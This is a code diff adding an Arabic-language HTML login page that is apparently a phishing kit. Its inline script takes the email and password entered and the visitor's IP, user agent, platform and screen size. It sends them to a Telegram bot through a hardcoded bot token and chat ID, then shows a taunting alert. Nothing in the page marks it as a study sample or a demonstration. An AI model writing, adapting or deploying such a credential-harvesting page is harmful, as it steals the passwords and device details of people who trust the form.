@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول</title>
+    <link rel="stylesheet" href="GT14.css">
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+</head>
+<body>
+    <div class="login-container">
+        <h1>تسجيل الدخول</h1>
+        <form id="login-form">
+            <label for="email">البريد الإلكتروني</label>
+            <input type="email" id="email" name="email" required>
+            
+            <label for="password">كلمة المرور</label>
+            <input type="password" id="password" name="password" required>
+            
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+    </div>
+    
+    <script>
+        const TOKEN = "7593919517:AAEZywTiuq-p__opUeDeOPVYgPMZcEfJu3Q"; // هنا التوكين
+        const CHAT_ID = "7575572127"; // هنا معرف الشات
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+        document.getElementById('login-form').addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            axios.get('https://api.ipify.org?format=json')
+                .then(response => {
+                    const ip = response.data.ip;
+                    const userAgent = navigator.userAgent;
+                    const platform = navigator.platform;
+                    const screenWidth = screen.width;
+                    const screenHeight = screen.height;
+                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+                    const message = `
+                        <b>محاولة تسجيل دخول جديدة</b>\n
+                        <b>البريد الإلكتروني:</b> ${email}\n
+                        <b>كلمة المرور:</b> ${password}\n
+                        <b>عنوان IP:</b> ${ip}\n
+                        <b>نوع الجهاز:</b> ${deviceType}\n
+                        <b>المنصة:</b> ${platform}\n
+                        <b>وكيل المستخدم:</b> ${userAgent}\n
+                        <b>دقة الشاشة:</b> ${screenWidth}x${screenHeight}
+                    `;
+
+                    axios.post(URI_API, {
+                        chat_id: CHAT_ID,
+                        parse_mode: 'html',
+                        text: message
+                    }).then(response => {
+                        alert('عمك رونالدو!');
+                    }).catch(error => {
+                        alert('خطأ في إرسال المعلومات. يرجى المحاولة مرة أخرى.');
+                    });
+                })
+                .catch(error => {
+                    alert('خطأ في جلب عنوان IP. يرجى المحاولة مرة أخرى.');
+                });
+        });
+    </script>
+</body>
+</html>
